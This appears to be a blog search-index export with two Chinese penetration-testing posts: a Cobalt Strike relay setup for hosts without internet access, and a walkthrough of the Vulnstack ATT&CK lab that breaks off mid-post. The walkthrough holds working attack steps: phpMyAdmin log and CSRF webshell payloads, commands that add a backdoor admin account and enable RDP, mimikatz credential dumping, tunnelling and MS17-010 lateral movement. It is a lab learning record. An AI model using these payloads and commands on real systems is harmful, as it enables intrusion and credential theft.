<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>目标机器不出网上线办法</title>
    <url>/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p><img src="http://static.zybuluo.com/1kbfree/zkqlgw3w6102uhg85fb6alp6/image_1e03au6485c51kv6f9d1kd1s3f9.png" alt="image_1e03au6485c51kv6f9d1kd1s3f9.png-24.8kB"></p>
<h2 id="上线办法"><a href="#上线办法" class="headerlink" title="上线办法"></a>上线办法</h2><p>1、设置中转监听</p>
<p>点击服务器<code>A</code>会话</p>
<p><img src="http://static.zybuluo.com/1kbfree/l8s0is4l7v0p92tv11i9qblm/image_1e03e2kebicn3fr1e0o1t4ljop9.png" alt="image_1e03e2kebicn3fr1e0o1t4ljop9.png-24.6kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/u5acix71lj8501kui7zuljvt/image_1e03h3ul114abfi3em318nakp39.png" alt="image_1e03h3ul114abfi3em318nakp39.png-143.3kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Name：备注名</span></pre></td></tr><tr><td class="code"><pre><span class="line">Payload：就图中这个</span></pre></td></tr><tr><td class="code"><pre><span class="line">Listen Host：服务器A的内网IP</span></pre></td></tr><tr><td class="code"><pre><span class="line">Listen Port：监听端口</span></pre></td></tr></table></figure>

<p>2、生成<code>exe</code>上线马</p>
<p><img src="http://static.zybuluo.com/1kbfree/f1avz3j671b3d4qy328rzk5y/image_1e03ed7pte4kgbb1cvpv7t51p13.png" alt="image_1e03ed7pte4kgbb1cvpv7t51p13.png-40.2kB"></p>
<p>3、利用<code>ipc</code>连接上传文件或直接<code>3389</code>连接拖进去</p>
<p>4、打开文件</p>
<p>5、上线成功</p>
<p><img src="http://static.zybuluo.com/1kbfree/1qkctpmcston21x9vgtvuahe/image_1e03h6dng1t7gbtb106s1mgi2ctm.png" alt="image_1e03h6dng1t7gbtb106s1mgi2ctm.png-76.8kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/h0wcjn7cx8kagks3fxag7zm3/image_1e03h71ci14pd1879kr1b6vgk913.png" alt="image_1e03h71ci14pd1879kr1b6vgk913.png-10.9kB"></p>
<h2 id="上线原理"><a href="#上线原理" class="headerlink" title="上线原理"></a>上线原理</h2><p>服务器<code>B</code>通过服务器<code>A</code>来连接我们的攻击机，然后我们执行服务器<code>B</code>的操作会先经过服务器<code>A</code>，然后由服务器<code>A</code>回显到攻击机/<code>Cs</code></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Vlunstack ATT&amp;CK实战系列一</title>
    <url>/2020/02/02/ATT/</url>
    <content><![CDATA[<blockquote>
<p>这几十<code>G</code>下的我有点蒙… 不得不感慨有一部好电脑对学安全的人是有多幸福了。。</p>
</blockquote>
<h2 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h2><blockquote>
<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
</blockquote>
<h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p><img src="http://static.zybuluo.com/1kbfree/fl8izilg62hl53jhouzxsseb/image_1dvv59t1pkkkt6ugs1c1e13m59.png" alt="image_1dvv59t1pkkkt6ugs1c1e13m59.png-6kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows 7有双网卡，也就是内外网IP</span></pre></td></tr><tr><td class="code"><pre><span class="line">外网IP：192.168.31.129</span></pre></td></tr><tr><td class="code"><pre><span class="line">内网IP：192.168.52.143</span></pre></td></tr><tr><td class="code"><pre><span class="line">且此服务器存在yxcms</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Windows 2008只有内网网卡</span></pre></td></tr><tr><td class="code"><pre><span class="line">内网IP： 192.168.52.138</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Win2k3只有内网网卡</span></pre></td></tr><tr><td class="code"><pre><span class="line">内网IP：192.168.52.141</span></pre></td></tr></table></figure>

<p>很明显，要想访问<code>Windows 2008</code>和<code>Win2k3</code>服务器必须要拿下<code>Windows 7</code>服务器，用它做跳板进内网进行横向渗透。</p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><h3 id="0x1-获取WEBSHELL"><a href="#0x1-获取WEBSHELL" class="headerlink" title="0x1.获取WEBSHELL"></a>0x1.获取WEBSHELL</h3><p>目标<code>URL</code>：<a href="http://192.168.31.129/yxcms/" target="_blank" rel="noopener">http://192.168.31.129/yxcms/</a></p>
<p>得知是<code>yxcms</code>，直接百度一把搜，找到如下文章</p>
<p><a href="https://bbs.ichunqiu.com/thread-45926-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45926-1-1.html</a></p>
<p>这里都是需要后台才可以<code>getshell</code>的，自己审计不太现实，故打开默认后台试试弱口令</p>
<p><a href="http://192.168.31.129/yxcms/index.php?r=admin/index/login" target="_blank" rel="noopener">http://192.168.31.129/yxcms/index.php?r=admin/index/login</a></p>
<p>将登录的数据包放入<code>Repeater</code>重放多次发现验证码没有自动刷新，故可以爆破，然后填了密码字典后放着等他跑，看看其他的点是否有漏洞~</p>
<p><img src="http://static.zybuluo.com/1kbfree/8f3umeylz5935ldaugitkg52/image_1dvv6utl34po1ff61i4aofn7ts1j.png" alt="image_1dvv6utl34po1ff61i4aofn7ts1j.png-94.1kB"></p>
<p>这里爆破出了<code>phpMyAdmin</code>，然后打开试试弱口令<code>root/root</code>直接就进去了</p>
<p><code>phpMyAdmin GetShell</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;on; # 开启日志</span></pre></td></tr><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;fuck.php&#39;; # 设置日志位置为php代码，然后保存的日志内容写上shell就可以了</span></pre></td></tr><tr><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[&quot;fuck&quot;]); ?&gt;&#39; # 这段查询会带入到日志中，然后就成功变成WebShell了</span></pre></td></tr></table></figure>

<p>然后使用蚁剑连接</p>
<p><img src="http://static.zybuluo.com/1kbfree/fekgku0n4kdgwoaxveyga17p/image_1dvv80pce8461ls1bme1audcr41m.png" alt="image_1dvv80pce8461ls1bme1audcr41m.png-38.4kB"></p>
<p>然后<code>yxcms</code>后台这边<code>burp</code>也跑出密码来了</p>
<p><img src="http://static.zybuluo.com/1kbfree/e1ju1a5msu06vx6jn9vcjptk/image_1dvv6o1ltqvogsf11cj1s1e1r42p.png" alt="image_1dvv6o1ltqvogsf11cj1s1e1r42p.png-133.6kB"></p>
<p>账户密码为：<code>admin/123456</code>，进入后台，直接上高速打<code>POC</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.31.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"filename"</span> <span class="attr">value</span>=<span class="string">"fuck"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"code"</span> <span class="attr">value</span>=<span class="string">"&amp;lt;&amp;#63;php&amp;#32;eval&amp;#40;&amp;#36;&amp;#95;POST&amp;#91;&amp;quot;fuck&amp;quot;&amp;#93;&amp;#41;&amp;#59;&amp;#63;&amp;gt;"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<p>打开如上<code>html</code>页面就会在生成一个<code>WebShell</code>在<code>http://192.168.31.129/yxcms/protected/apps/default/view/default/fuck.php</code>页面，密码为<code>fuck</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/mzr1poxiigisuqevzt3m5tub/image_1dvv8beon7vp1n181m381rte4lq2g.png" alt="image_1dvv8beon7vp1n181m381rte4lq2g.png-134.9kB"></p>
<h3 id="0x2-内网渗透"><a href="#0x2-内网渗透" class="headerlink" title="0x2.内网渗透"></a>0x2.内网渗透</h3><p>首先查看是什么权限，是否有域</p>
<p><img src="http://static.zybuluo.com/1kbfree/6xplfn6oz7dvxabfjez5s0w2/image_1dvv8f4r0180514c717g8frp11rn30.png" alt="image_1dvv8f4r0180514c717g8frp11rn30.png-143.5kB"></p>
<p>管理员权限，且有域~</p>
<p>然后一般拿下<code>window</code>的话我都会选择去连接它的远程桌面（<code>PORT:3389</code>）</p>
<p>输入<code>netstat -ano | find &quot;3389&quot;</code>没有回显，证明未开启远程桌面服务，用如下命令开启</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/74evqtfm2kvrojy9wvb34omi/image_1dvv8p3qvrp88k61618188tkii3d.png" alt="image_1dvv8p3qvrp88k61618188tkii3d.png-14.8kB"></p>
<p>成功开启。</p>
<p>然后开启了<code>3389</code>后可以选择读管理员的明文密码或添加用户，前者可能因为读不出明文密码（<code>03</code>前的操作系统使用<code>LM HASH</code>加密明文，可逆，越后的系统都使用新的加密<code>NTLM HASH</code>），所以这里选择后者添加密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net user test @!FuckSEC!@ &#x2F;add # 添加账户密码</span></pre></td></tr><tr><td class="code"><pre><span class="line">命令成功完成。</span></pre></td></tr><tr><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net localgroup administrators test &#x2F;add # 给test账户添加为管理员权限</span></pre></td></tr><tr><td class="code"><pre><span class="line">命令成功完成。</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net user test # 查询是否成功添加test用户</span></pre></td></tr><tr><td class="code"><pre><span class="line">用户名                 test</span></pre></td></tr><tr><td class="code"><pre><span class="line">全名                   </span></pre></td></tr><tr><td class="code"><pre><span class="line">注释                   </span></pre></td></tr><tr><td class="code"><pre><span class="line">用户的注释             </span></pre></td></tr><tr><td class="code"><pre><span class="line">国家&#x2F;地区代码          000 (系统默认值)</span></pre></td></tr><tr><td class="code"><pre><span class="line">帐户启用               Yes</span></pre></td></tr><tr><td class="code"><pre><span class="line">帐户到期               从不</span></pre></td></tr><tr><td class="code"><pre><span class="line">上次设置密码           2020&#x2F;2&#x2F;1 10:27:52</span></pre></td></tr><tr><td class="code"><pre><span class="line">密码到期               2020&#x2F;3&#x2F;14 10:27:52</span></pre></td></tr><tr><td class="code"><pre><span class="line">密码可更改             2020&#x2F;2&#x2F;2 10:27:52</span></pre></td></tr><tr><td class="code"><pre><span class="line">需要密码               Yes</span></pre></td></tr><tr><td class="code"><pre><span class="line">用户可以更改密码       Yes</span></pre></td></tr><tr><td class="code"><pre><span class="line">允许的工作站           All</span></pre></td></tr><tr><td class="code"><pre><span class="line">登录脚本               </span></pre></td></tr><tr><td class="code"><pre><span class="line">用户配置文件           </span></pre></td></tr><tr><td class="code"><pre><span class="line">主目录                 </span></pre></td></tr><tr><td class="code"><pre><span class="line">上次登录               从不</span></pre></td></tr><tr><td class="code"><pre><span class="line">可允许的登录小时数     All</span></pre></td></tr><tr><td class="code"><pre><span class="line">本地组成员             *Administrators       *Users                </span></pre></td></tr><tr><td class="code"><pre><span class="line">全局组成员             *None                 </span></pre></td></tr><tr><td class="code"><pre><span class="line">命令成功完成。</span></pre></td></tr></table></figure>

<p>然后使用账号密码<code>test/@!FuckSEC!@</code>登录远程桌面</p>
<p><img src="http://static.zybuluo.com/1kbfree/7b58fz38ol7mhzo5cuvuchf3/image_1dvv9is5s8291nco1k1h60418nu9.png" alt="image_1dvv9is5s8291nco1k1h60418nu9.png-34.8kB"></p>
<p>哦吼！fuck</p>
<p>一开始猜测可能是防火墙禁止<code>3389</code>端口进出网，然后经过端口转发后才发现并不是，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/xz1a2crewbm6ub0d75k4gp29/image_1dvv9v8mg1hiuv6ih6fja8ficm.png" alt="image_1dvv9v8mg1hiuv6ih6fja8ficm.png-219.7kB"></p>
<p>防火墙开启了<strong>阻止所有与未在允许程序列表中的程序的连接</strong>，换句话说，设置了白名单，只能本地连接，那么我们使用<code>ngrok</code>的<code>frp</code>创建一个<code>TCP</code>隧道</p>
<p>1、首先在<code>http://ngrok.cc/user.html</code>注册用户，然后开通<code>FRP</code>服务器</p>
<p><img src="http://static.zybuluo.com/1kbfree/bzh6w3q8da6hdj0h2n29jrgw/image_1dvvjh63lruhq74125q1vpkj329.png" alt="image_1dvvjh63lruhq74125q1vpkj329.png-25.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/3rfly73id0l3qx376w6nwchw/image_1dvvjjmc61efsdc0c1b10pi65sm.png" alt="image_1dvvjjmc61efsdc0c1b10pi65sm.png-39.2kB"></p>
<p>2、下载<code>frp</code>客户端工具</p>
<p><img src="http://static.zybuluo.com/1kbfree/8t9lh5j87htrwlyjty00o7xs/image_1dvvjkld61k4b1dok18j415u41un413.png" alt="image_1dvvjkld61k4b1dok18j415u41un413.png-73.4kB"></p>
<p>将工具上传至目标服务器，然后执行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sunny.exe --clientid=隧道id</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/zyih8jkzbx80pbimvprlvegq/image_1dvvk23b01rlob381his1dhc1iv71g.png" alt="image_1dvvk23b01rlob381his1dhc1iv71g.png-40.7kB"></p>
<p>3、然后连接<code>xxxx.xxxx.xxx:10062</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/xxwv7zwg0241b1ll3298c8uj/image_1dvvk8a4sks5usfi3c1i354u01t.png" alt="image_1dvvk8a4sks5usfi3c1i354u01t.png-67.2kB"></p>
<p>内网已进入，然后我习惯性直接上去关防火墙，然后用<code>cs</code>上线</p>
<p>这个线上的很心塞。。</p>
<p><img src="http://static.zybuluo.com/1kbfree/pyxsxyq3rrp47s7896btg84p/image_1dvvlejr51dfdili1tk8ub9qqu2a.png" alt="image_1dvvlejr51dfdili1tk8ub9qqu2a.png-108.9kB"></p>
<p>生成了好多<code>shell</code>然后过了好一会才过来。</p>
<h3 id="0x3-信息收集"><a href="#0x3-信息收集" class="headerlink" title="0x3.信息收集"></a>0x3.信息收集</h3><p>1、使用<code>ipconfig /all</code>看网络环境（查询是否有域）</p>
<p><img src="http://static.zybuluo.com/1kbfree/yvg7ori1zig13c962g7r9qb7/image_1dvvmm3ch1l1l1n9g1areg4ccqi2n.png" alt="image_1dvvmm3ch1l1l1n9g1areg4ccqi2n.png-135.7kB"></p>
<p>2、<code>net config Workstation</code>查询当前计算机名、计算机全名、用户名、工作站、软件版本、工作站域、工作站域 <code>DNS</code> 名称、登录域</p>
<p><img src="http://static.zybuluo.com/1kbfree/8yyovuzdqc2un10fp44irv7t/image_1dvvn21o0u6p1j3k1uc41jb490a34.png" alt="image_1dvvn21o0u6p1j3k1uc41jb490a34.png-37kB"></p>
<p>这样也能看</p>
<p><img src="http://static.zybuluo.com/1kbfree/rx884prdb18ub4ot0d2rmt39/image_1dvvnbh951kbh2lo95f18141tvs3h.png" alt="image_1dvvnbh951kbh2lo95f18141tvs3h.png-99.9kB"></p>
<p>3、查看进程<code>tasklist /v</code> <strong>有些进程可能是域用户启的­&gt;通过管理员权限 凭证窃取 ­&gt; 窃取域用户的凭证</strong></p>
<p>4、显示正由指定的计算机共享的域、计算机或资源的列表。如果在没有参数的情况下使用，则<code>net view</code>显示当前域中的计算机列表。</p>
<p><img src="http://static.zybuluo.com/1kbfree/4zpmc6xkvpuy106yi2x5t582/image_1dvvo1j211mejn6es3hk0m13334e.png" alt="image_1dvvo1j211mejn6es3hk0m13334e.png-20.2kB"></p>
<p>这里<code>OWA</code>主机是主域控制器，<code>IP</code>为<code>192.168.52.138</code>，然后还有一个主机名为<code>ROOT-TVI862UBEH</code>，<code>IP</code>为<code>192.168.52.141</code>（环境3）</p>
<p>而本机不是域机器所以跑不出域相关信息，着重于横向渗透。</p>
<p>目前知道的数据就行了，然后在本地抓一下管理员密码（<code>Cs</code>跑内存<code>HASH</code>、注册表<code>HASH</code>）</p>
<h3 id="0x4-密码获取"><a href="#0x4-密码获取" class="headerlink" title="0x4.密码获取"></a>0x4.密码获取</h3><p>1、直接用<code>cs</code>的<code>hashdump</code>读内存密码。</p>
<p><img src="http://static.zybuluo.com/1kbfree/qno6rbnzckscl7dbzuu7rdtx/image_1dvvol5ngh6h1r9d145i6ds17km4r.png" alt="image_1dvvol5ngh6h1r9d145i6ds17km4r.png-21.1kB"></p>
<p>2、用<code>mimikatz</code>读注册表密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> logonpasswords</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">读出的信息...</span></pre></td></tr></table></figure>

<p>我们可以直接在<code>Credentials</code>模块下看的清清楚楚</p>
<p><img src="http://static.zybuluo.com/1kbfree/k731frer51wrf3s6eumg4cbs/image_1dvvp5roa15c41ass13h91ga2fbo58.png" alt="image_1dvvp5roa15c41ass13h91ga2fbo58.png-54.5kB"></p>
<p>这里直接抓取了<code>Administrator</code>的明文密码<code>hongrisec@2019</code></p>
<h3 id="0x5-横向渗透"><a href="#0x5-横向渗透" class="headerlink" title="0x5.横向渗透"></a>0x5.横向渗透</h3><blockquote>
<p>横向渗透一般就是获取内网其他主机的权限</p>
</blockquote>
<p>我比较喜欢用<code>msf</code>来进行横向渗透，所以这里要使用到<code>msf</code>，但是<code>Win2k3</code>和<code>Window 2008</code>都是内网主机，我们攻击机的<code>msf</code>无法访问，所以我们要在<code>Window s7</code>上开启一个隧道，将<code>msf</code>带入内网。</p>
<h4 id="开通隧道带msf进内网"><a href="#开通隧道带msf进内网" class="headerlink" title="开通隧道带msf进内网"></a>开通隧道带msf进内网</h4><p>1、在<code>cs</code>上开通<code>socks</code>通道</p>
<p><img src="http://static.zybuluo.com/1kbfree/iomuq72x44nfwt5ezmf6kjy3/image_1e01pagdtc80udk146i3h5mdt6v.png" alt="image_1e01pagdtc80udk146i3h5mdt6v.png-18.9kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socks 9999</span></pre></td></tr></table></figure>

<p>2、在攻击机上设置<code>proxychains</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">socks4    127.0.0.1 9999</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/f2n6s5vd142ucl7zqnhr1lf6/image_1e01pciog1o0eup1auiogs1n0l7s.png" alt="image_1e01pciog1o0eup1auiogs1n0l7s.png-69.2kB"></p>
<blockquote>
<p>小白肯定会问为什么这里设置的代理是<code>127.0.0.1 9999</code>，因为我<code>cs</code>的服务端是<code>kali</code>，然后在<code>cs</code>执行<code>socks 9999</code>相当于在我<code>kali</code>上开通一个<code>9999</code>的<code>socks</code>代理，然后我<code>kali</code>直接连本地的<code>9999</code>端口就可以了</p>
</blockquote>
<p>3、使用代理打开<code>msf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ohtdrx0x3letlmth5cpragyw/image_1e01pibd0bn6124450dk94ba89.png" alt="image_1e01pibd0bn6124450dk94ba89.png-81.9kB"></p>
<p>这样<code>msf</code>就成功进内网啦</p>
<p>然后这里尝试去跑一下<code>MS08-067</code>（失败）</p>
<blockquote>
<p>插播！ 这里用<code>cs</code>的<code>socks</code>代理不稳定，我上传了<code>ew</code>开了<code>1080</code>监听然后也是使用<code>proxychains</code>代理</p>
</blockquote>
<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><p>因为目标机安装了<code>nmap</code>所以直接跑了</p>
<p><img src="http://static.zybuluo.com/1kbfree/lfnmz3q6wnvaz9p857vao17h/image_1e02t8sk11o56olo1u6t1fkbr4u23.png" alt="image_1e02t8sk11o56olo1u6t1fkbr4u23.png-46.7kB"></p>
<p>开启了<code>445</code>端口，然后这里试了下<code>ms08-067</code>，失败告终。</p>
<h4 id="拿下xp"><a href="#拿下xp" class="headerlink" title="拿下xp"></a>拿下xp</h4><p>然后尝试了<code>admin/smb/ms17_010_command</code>这个模块发现是可以的</p>
<p><img src="http://static.zybuluo.com/1kbfree/lly0law1gnbzy6k53ejjf1gw/image_1e033nn16l9limi1adcinb18d82g.png" alt="image_1e033nn16l9limi1adcinb18d82g.png-189.3kB"></p>
<p>然后直接执行添加用户命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user test @!FuckSEC!@ &#x2F;add</span></pre></td></tr><tr><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;add</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/xtylowsh306as79d8p6k19aw/image_1e033sqmu1hf81jdhh7e1qmq1nog2t.png" alt="image_1e033sqmu1hf81jdhh7e1qmq1nog2t.png-218.3kB"></p>
<p>查看是否添加成功</p>
<p><img src="http://static.zybuluo.com/1kbfree/t9ag8mqc9nho2y2hciainmpg/image_1e033u8lj11k4e441j181e5r7i3a.png" alt="image_1e033u8lj11k4e441j181e5r7i3a.png-171kB"></p>
<p>然后开启他的<code>3389</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2003上开启3389的命令行语句</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span></pre></td></tr></table></figure>

<p>然后使用<code>proxychains</code>连接他的<code>3389</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/guc3xu119n20jh7ba1to2bha/image_1e034uo80138jdrl1u8m6llf2d3n.png" alt="image_1e034uo80138jdrl1u8m6llf2d3n.png-67.6kB"></p>
<p>然后这里我想让<code>2003</code>系统上上线<code>Cs</code>，操作过程看我这篇文章</p>
<p><a href="https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/">https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</a></p>
<h3 id="对xp的信息收集"><a href="#对xp的信息收集" class="headerlink" title="对xp的信息收集"></a>对xp的信息收集</h3><p>常规的信息收集</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span></pre></td></tr><tr><td class="code"><pre><span class="line">查看网络环境</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/gpxoyw7tc4eyttt7qx1b4bhu/image_1e03itg6pd0b1bmsm6p1cqovlf9.png" alt="image_1e03itg6pd0b1bmsm6p1cqovlf9.png-52.9kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有Primary Dns Suffix 说明是域内 为域机器</span></pre></td></tr></table></figure>

<p>然后查看当前登录域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/avp8t5tu45uo3e5fk38ehwbm/image_1e03j8gmd1fq5164a1giphl19hum.png" alt="image_1e03j8gmd1fq5164a1giphl19hum.png-14.9kB"></p>
<p>然后依次类推查询，发现<code>192.168.52.138</code>是主域机器</p>
<p><img src="http://static.zybuluo.com/1kbfree/6jjbszkack81d6rvx0kqy8br/image_1e03jf691o441elpcjp1uas18en13.png" alt="image_1e03jf691o441elpcjp1uas18en13.png-24.5kB"></p>
<p>干他！</p>
<h3 id="对域机器进行渗透"><a href="#对域机器进行渗透" class="headerlink" title="对域机器进行渗透"></a>对域机器进行渗透</h3><h4 id="端口探测-1"><a href="#端口探测-1" class="headerlink" title="端口探测"></a>端口探测</h4><p><img src="http://static.zybuluo.com/1kbfree/npgbj68tsf1xzhgivsxt5hyd/image_1e03jj3fmcpa1109fvg10v0gi51g.png" alt="image_1e03jj3fmcpa1109fvg10v0gi51g.png-50.4kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span></pre></td></tr><tr><td class="code"><pre><span class="line">53&#x2F;tcp    open  domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">80&#x2F;tcp    open  http</span></pre></td></tr><tr><td class="code"><pre><span class="line">88&#x2F;tcp    open  kerberos-sec</span></pre></td></tr><tr><td class="code"><pre><span class="line">135&#x2F;tcp   open  msrpc</span></pre></td></tr><tr><td class="code"><pre><span class="line">139&#x2F;tcp   open  netbios-ssn</span></pre></td></tr><tr><td class="code"><pre><span class="line">389&#x2F;tcp   open  ldap</span></pre></td></tr><tr><td class="code"><pre><span class="line">445&#x2F;tcp   open  microsoft-ds</span></pre></td></tr><tr><td class="code"><pre><span class="line">464&#x2F;tcp   open  kpasswd5</span></pre></td></tr><tr><td class="code"><pre><span class="line">593&#x2F;tcp   open  http-rpc-epmap</span></pre></td></tr><tr><td class="code"><pre><span class="line">636&#x2F;tcp   open  ldapssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">3268&#x2F;tcp  open  globalcatLDAP</span></pre></td></tr><tr><td class="code"><pre><span class="line">3269&#x2F;tcp  open  globalcatLDAPssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">49154&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49155&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49157&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49158&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49161&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49167&#x2F;tcp open  unknown</span></pre></td></tr></table></figure>

<h4 id="使用445添加用户"><a href="#使用445添加用户" class="headerlink" title="使用445添加用户"></a>使用445添加用户</h4><p><code>445</code>开放，使用<code>admin/smb/ms17_010_command</code>成功，只能一条一条命令执行…</p>
<p>然后执行添加用户的语句</p>
<p><img src="http://static.zybuluo.com/1kbfree/r3r5l230iuqd2nzfju9feu0q/image_1e03kithl13dg11cm14be1v3h1j7t1t.png" alt="image_1e03kithl13dg11cm14be1v3h1j7t1t.png-215.6kB"></p>
<p>用户还是<code>test</code>密码还是<code>@!FuckSEC!@</code></p>
<h4 id="使用ipc上传上线马"><a href="#使用ipc上传上线马" class="headerlink" title="使用ipc上传上线马"></a>使用ipc上传上线马</h4><p>这里使用<code>ipc</code>连接上传上线马，然后用计划任务执行该文件</p>
<p><img src="http://static.zybuluo.com/1kbfree/y5lknl43ut5k6862dyxv54b8/image_1e03klhlrkb3jqu1p674u516sn2a.png" alt="image_1e03klhlrkb3jqu1p674u516sn2a.png-54.7kB"></p>
<blockquote>
